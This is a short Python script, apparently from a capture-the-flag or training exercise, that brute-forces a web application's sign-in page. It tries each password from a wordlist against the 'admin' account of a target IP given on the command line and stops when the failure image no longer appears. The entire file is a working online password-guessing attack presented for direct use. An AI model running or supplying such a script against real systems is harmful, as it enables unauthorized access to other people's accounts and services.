#!/usr/bin/env python3

import requests
import sys

passwords = open('passwords.txt', 'r')
lines = passwords.readlines()
def brute_force(ip):
    for line in lines:
        res = requests.get('http://'+ip,
        params={'page': 'signin', 'Login': 'Login', 'username': 'admin', 'password': line.strip()}
        )
        if("WrongAnswer.gif" in res.text):
            print("❌   "+line.strip())
        else:
            print("✅   "+line.strip())
            break

if len(sys.argv) == 2 and sys.argv[1]:
    brute_force(sys.argv[1])
else:
    print("Usage: ./attack.py <ip>")
    exit()